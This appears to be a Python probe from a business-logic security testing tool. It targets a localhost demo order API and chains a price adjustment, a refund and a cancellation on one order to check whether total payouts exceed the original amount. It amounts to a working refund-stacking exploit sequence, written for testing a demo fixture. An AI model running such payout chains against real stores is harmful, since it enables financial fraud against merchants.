"""
FlowBusters Cross-Flow Mutation: STATE_INTERLEAVING
Candidate: CF-004 (price + cancel + refund)
Target: /api/order/price-adjustment then /api/order/refund/request then
       /api/order/refund/complete then /api/order/cancel
Attack: Compose all three payout actions — price adjustment ($30, source
       'price'), refund completion ($100, source 'refund'), and cancellation
       ($100, source 'cancel') — on the same order. If all three succeed,
       totalReturned = 30 + 100 + 100 = 230 > 100 (originalAmount).

Invariant: sum_lte — order.totalReturned <= order.originalAmount
"""
import asyncio
import json
import httpx

TARGET = "http://localhost:3000"
RESET_URL = f"{TARGET}/api/demo/reset"
GET_ORDER_URL = f"{TARGET}/api/order"
PRICE_ADJ_URL = f"{TARGET}/api/order/price-adjustment"
REFUND_REQ_URL = f"{TARGET}/api/order/refund/request"
REFUND_CPL_URL = f"{TARGET}/api/order/refund/complete"
CANCEL_URL = f"{TARGET}/api/order/cancel"

MUTATION_TYPE = "STATE_INTERLEAVING"
CANDIDATE_ID = "CF-004"
TITLE = "CF-004: all three payout actions composed may far exceed originalAmount"

HEADERS = {"accept": "application/json"}

RULE = {
    "source": "agent_inference",
    "provenance": {
        "schema_version": 1,
        "source_run": "price",
        "artifact": "state_map.json",
        "rule_id": "UIR-002",
        "fact_ids": ["UIR-002-F1", "UIR-002-F2", "UIR-002-F3"],
    },
}

INVARIANT = {
    "operator": "sum_lte",
    "terms": [["order", "totalReturned"]],
    "limit": ["order", "originalAmount"],
}


def _capture(method, url, body, resp):
    seq = resp.extensions.get("flowbusters_sequence")
    if seq is None:
        raise RuntimeError("flowbusters_sequence missing from response.extensions")
    try:
        parsed = resp.json()
    except Exception:
        parsed = resp.text
    return {
        "sequence": seq,
        "status_code": resp.status_code,
        "complete": True,
        "request": {"method": method, "url": url, "body": body},
        "response": {"actual": parsed},
    }


def _resolve_path(body, path):
    val = body
    for key in path:
        val = val[key]
    return float(val)


def _compute_violation(after_body):
    term_sum = 0.0
    for term_path in INVARIANT["terms"]:
        term_sum += _resolve_path(after_body, term_path)
    limit = _resolve_path(after_body, INVARIANT["limit"])
    return bool(term_sum > limit)


async def probe():
    async with httpx.AsyncClient(timeout=30.0, headers=HEADERS) as client:
        # --- Setup: reset fixture ---
        reset_resp = await client.post(RESET_URL)
        reset_cap = _capture("POST", RESET_URL, None, reset_resp)

        # --- Before: capture initial state ---
        before_resp = await client.get(GET_ORDER_URL)
        before_cap = _capture("GET", GET_ORDER_URL, None, before_resp)

        # --- Action 1: price adjustment (source 'price') ---
        # Payout: $30. Expected: totalReturned 0->30.
        adj_resp = await client.post(PRICE_ADJ_URL)
        adj_cap = _capture("POST", PRICE_ADJ_URL, None, adj_resp)

        # --- Action 2: refund request (source 'refund') ---
        # Creates $100 pending refund. Should be blocked if priceProtection completed.
        req_resp = await client.post(REFUND_REQ_URL)
        req_cap = _capture("POST", REFUND_REQ_URL, None, req_resp)

        # --- Action 3: refund completion (source 'refund') ---
        # Payout: $100. If accepted, totalReturned 30->130.
        cpl_resp = await client.post(REFUND_CPL_URL)
        cpl_cap = _capture("POST", REFUND_CPL_URL, None, cpl_resp)

        # --- Action 4: cancel (source 'cancel') ---
        # Payout: $100. If accepted, totalReturned 130->230.
        cancel_resp = await client.post(CANCEL_URL)
        cancel_cap = _capture("POST", CANCEL_URL, None, cancel_resp)

        # --- After: capture final state ---
        after_resp = await client.get(GET_ORDER_URL)
        after_cap = _capture("GET", GET_ORDER_URL, None, after_resp)

    after_body = after_cap["response"]["actual"]
    if not isinstance(after_body, dict):
        raise RuntimeError(f"AFTER response is not a JSON object: {type(after_body)}")

    observed = _compute_violation(after_body)
    after_order = after_body.get("order", {})
    total_returned = after_order.get("totalReturned")
    original_amount = after_order.get("originalAmount")
    order_status = after_order.get("orderStatus")
    pp_status = after_order.get("priceProtection", {}).get("status")
    cancellation_status = after_order.get("cancellation", {}).get("status")
    refund_status = after_order.get("refund", {}).get("status")
    pp_amount = after_order.get("priceProtection", {}).get("adjustmentAmount", 0)
    cancellation_amount = after_order.get("cancellation", {}).get("reimbursementAmount", 0)
    refund_completed = after_order.get("refund", {}).get("completedAmount", 0)

    description = (
        f"Cross-flow CF-004: all three payout actions composed on the same order: "
        f"price adjustment (source 'price', ${pp_amount}), "
        f"refund request + completion (source 'refund', completedAmount=${refund_completed}), "
        f"cancel (source 'cancel', reimbursementAmount=${cancellation_amount}). "
        f"Final state: totalReturned={total_returned}, originalAmount={original_amount}, "
        f"orderStatus={order_status}, priceProtection.status={pp_status}, "
        f"cancellation.status={cancellation_status}, refund.status={refund_status}. "
        f"Invariant sum_lte: totalReturned <= originalAmount. "
        f"Violated: {observed}."
    )

    verification = {
        "predicate": "business_rule_must_hold",
        "rule": RULE,
        "setup": [reset_cap],
        "before": before_cap,
        "actions": [adj_cap, req_cap, cpl_cap, cancel_cap],
        "after": after_cap,
        "invariant": INVARIANT,
        "violation": {
            "observed": observed,
            "description": description,
        },
    }

    outcome = "CONFIRMED" if observed else "NOT_REPRODUCED"

    result = {
        "title": TITLE,
        "mutation_type": MUTATION_TYPE,
        "url": CANCEL_URL,
        "status_code": cancel_cap["status_code"],
        "outcome": outcome,
        "candidate_id": CANDIDATE_ID,
        "source_runs": ["price", "cancel", "refund"],
        "analysis_source": "CROSS_FLOW",
        "expected_rejection": True,
        "response_body_snippet": json.dumps(after_body)[:500],
        "verification": verification,
    }
    print(json.dumps(result))


if __name__ == "__main__":
    asyncio.run(probe())